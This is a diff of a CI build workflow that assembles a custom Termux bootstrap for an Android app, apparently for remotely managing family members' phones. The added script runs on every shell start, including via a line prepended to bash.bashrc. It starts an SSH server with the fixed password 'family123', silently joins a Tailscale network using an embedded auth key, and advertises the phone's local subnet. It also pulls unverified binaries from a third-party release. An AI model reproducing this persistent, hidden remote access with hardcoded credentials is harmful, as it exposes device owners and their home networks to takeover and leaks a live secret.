@@ -57,7 +57,13 @@ jobs:
                   echo "下载 $pkg: $deb_path"
                   curl -sSL "$MAIN_POOL/$deb_path" -o "$pkg.deb" || \
                   curl -sSL "https://mirrors.tuna.tsinghua.edu.cn/termux/apt/termux-main/$deb_path" -o "$pkg.deb"
-                  dpkg-deb -x "$pkg.deb" /tmp/custom_bootstrap/rootfs/
+                  mkdir -p deb_extracted
+                  dpkg-deb -x "$pkg.deb" deb_extracted/
+                  # 将 data/data/com.termux/files/usr/ 结构内容无缝合入 rootfs/ 根目录
+                  if [ -d "deb_extracted/data/data/com.termux/files/usr" ]; then
+                      cp -a deb_extracted/data/data/com.termux/files/usr/* rootfs/
+                  fi
+                  rm -rf deb_extracted
               else
                   echo "错误: 未在索引中找到 $pkg"
                   exit 1
@@ -67,75 +73,87 @@ jobs:
           get_deb "android-tools"
           get_deb "openssh"
 
-          # 2.2 直接下载 Tailscale 官方编译的 Linux arm64 二进制 (静态链接 Go 二进制，零依赖，跨平台通杀)
-          echo "下载 Tailscale 官方 arm64 二进制..."
-          TS_TAR=$(curl -sSL "https://pkgs.tailscale.com/stable/" | grep -oE 'tailscale_[0-9\.]+_arm64\.tgz' | head -n 1)
-          curl -sSL "https://pkgs.tailscale.com/stable/$TS_TAR" -o tailscale.tgz
-          mkdir -p ts_extracted
-          tar -xzf tailscale.tgz -C ts_extracted --strip-components=1
-          mkdir -p rootfs/bin
-          cp ts_extracted/tailscale ts_extracted/tailscaled rootfs/bin/
+          # 2.2 下载适配 Android/Termux 非 Root 环境的 Tailscale 编译二进制 (解决了 Android 11+ netlinkrib 权限拦截问题)
+          echo "下载专为 Termux 适配的 Tailscale aarch64 二进制..."
+          TS_RELEASE="v1.104.0"
+          curl -sSL "https://github.com/bropines/tailscale-termux-cli/releases/download/${TS_RELEASE}/tailscale-aarch64" -o rootfs/bin/tailscale
+          curl -sSL "https://github.com/bropines/tailscale-termux-cli/releases/download/${TS_RELEASE}/tailscaled-aarch64" -o rootfs/bin/tailscaled
           chmod +x rootfs/bin/tailscale rootfs/bin/tailscaled
 
-          # 3. 注入后台自启与静默入网脚本 (etc/profile.d/00-tailscale-autostart.sh)
+          # 3. 注入后台自启与静默入网脚本 (挂载至 etc/bash.bashrc 与 etc/profile.d 双重保障)
           PROFILE_D="rootfs/etc/profile.d"
           mkdir -p "$PROFILE_D"
           
           # 使用默认内置 Token 或 Secrets 注入的 Token
           EFFECTIVE_KEY="${TS_AUTHKEY:-tskey-auth-kTTRXt8cki11CNTRL-3wTBKC22YsFwUhRt7FzasFJx6r7dUsfcZ}"
           
-          cat <<EOF > "$PROFILE_D/00-tailscale-autostart.sh"
+          cat <<'EOF' > "$PROFILE_D/00-tailscale-autostart.sh"
           # 确保全局 PATH 包含 usr/bin
-          export PATH="/data/data/com.termux/files/usr/bin:\$PATH"
+          export PATH="/data/data/com.termux/files/usr/bin:$PATH"
 
           # 自动激活唤醒锁
           command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null || true
 
           # 启动 OpenSSH (端口 8022，密码 family123)
           if command -v sshd >/dev/null 2>&1 && ! pgrep -f "sshd" >/dev/null 2>&1; then
+              ssh-keygen -A >/dev/null 2>&1 || true
               echo -e "family123\nfamily123" | passwd >/dev/null 2>&1 || true
-              /data/data/com.termux/files/usr/bin/sshd
+              /data/data/com.termux/files/usr/bin/sshd 2>/dev/null || true
           fi
 
           # 启动 Tailscale 用户态守护进程
-          STATE_DIR="\$HOME/.local/share/tailscale"
+          STATE_DIR="$HOME/.local/share/tailscale"
           RUN_DIR="/data/data/com.termux/files/usr/var/run/tailscale"
-          mkdir -p "\$STATE_DIR" "\$RUN_DIR"
-          SOCKET="\$RUN_DIR/tailscaled.sock"
+          mkdir -p "$STATE_DIR" "$RUN_DIR"
+          SOCKET="$RUN_DIR/tailscaled.sock"
 
           if ! pgrep -f "tailscaled.*userspace" >/dev/null 2>&1; then
               nohup /data/data/com.termux/files/usr/bin/tailscaled \
-                  --statedir="\$STATE_DIR" \
-                  --socket="\$SOCKET" \
+                  --statedir="$STATE_DIR" \
+                  --socket="$SOCKET" \
                   --tun=userspace-networking \
                   --socks5-server=localhost:1055 \
                   --outbound-http-proxy-listen=localhost:1055 \
-                  > "\$STATE_DIR/tailscaled.log" 2>&1 &
-              sleep 2
+                  > "$STATE_DIR/tailscaled.log" 2>&1 &
           fi
 
-          # 自动入网绑定
-          if ! /data/data/com.termux/files/usr/bin/tailscale --socket="\$SOCKET" status >/dev/null 2>&1; then
-              MODEL_NAME=\$(getprop ro.product.model 2>/dev/null | tr ' ' '-' | tr -cd '[:alnum:]-' | tr '[:upper:]' '[:lower:]')
-              NODE_NAME="phone-\${MODEL_NAME:-parent}"
+          # 自动入网绑定 (等待 socket 就绪并重试)
+          (
+              for i in $(seq 1 10); do
+                  if [ -S "$SOCKET" ]; then
+                      break
+                  fi
+                  sleep 1
+              done
 
-              WLAN_IP=\$(ip -4 addr show wlan0 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1 || true)
-              LOCAL_ROUTE=""
-              if [ -n "\$WLAN_IP" ]; then
-                  SUBNET_PREFIX=\$(echo "\$WLAN_IP" | cut -d'.' -f1-3)
-                  LOCAL_ROUTE="\${SUBNET_PREFIX}.0/24"
+              if ! /data/data/com.termux/files/usr/bin/tailscale --socket="$SOCKET" status >/dev/null 2>&1; then
+                  MODEL_NAME=$(getprop ro.product.model 2>/dev/null | tr ' ' '-' | tr -cd '[:alnum:]-' | tr '[:upper:]' '[:lower:]')
+                  NODE_NAME="phone-${MODEL_NAME:-parent}"
+
+                  WLAN_IP=$(ip -4 addr show wlan0 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -n 1 || true)
+                  LOCAL_ROUTE=""
+                  if [ -n "$WLAN_IP" ]; then
+                      SUBNET_PREFIX=$(echo "$WLAN_IP" | cut -d'.' -f1-3)
+                      LOCAL_ROUTE="${SUBNET_PREFIX}.0/24"
+                  fi
+
+                  UP_ARGS=("--auth-key=__EFFECTIVE_KEY__" "--hostname=$NODE_NAME" "--reset" "--timeout=30s")
+                  if [ -n "$LOCAL_ROUTE" ]; then
+                      UP_ARGS+=("--advertise-routes=$LOCAL_ROUTE")
+                  fi
+
+                  /data/data/com.termux/files/usr/bin/tailscale --socket="$SOCKET" up "${UP_ARGS[@]}" --advertise-tags="tag:managed-node" >/dev/null 2>&1 || true
               fi
+          ) >/dev/null 2>&1 &
+EOF
 
-              UP_ARGS=("--auth-key=$EFFECTIVE_KEY" "--hostname=\$NODE_NAME" "--reset" "--timeout=30s")
-              if [ -n "\$LOCAL_ROUTE" ]; then
-                  UP_ARGS+=("--advertise-routes=\$LOCAL_ROUTE")
-              fi
-
-              nohup /data/data/com.termux/files/usr/bin/tailscale --socket="\$SOCKET" up "\${UP_ARGS[@]}" --advertise-tags="tag:managed-node" >/dev/null 2>&1 &
-          fi
-          EOF
-
+          sed -i "s|__EFFECTIVE_KEY__|$EFFECTIVE_KEY|g" "$PROFILE_D/00-tailscale-autostart.sh"
           chmod +x "$PROFILE_D/00-tailscale-autostart.sh"
+
+          # 双重保证：在 etc/bash.bashrc 头部植入，确保即使非登录交互 Shell 也必定触发执行
+          if [ -f "rootfs/etc/bash.bashrc" ]; then
+              echo -e "[ -r /data/data/com.termux/files/usr/etc/profile.d/00-tailscale-autostart.sh ] && . /data/data/com.termux/files/usr/etc/profile.d/00-tailscale-autostart.sh\n$(cat rootfs/etc/bash.bashrc)" > rootfs/etc/bash.bashrc
+          fi
 
           # 4. 重新打包为 zip 并放回 app/src/main/cpp/
           cd rootfs
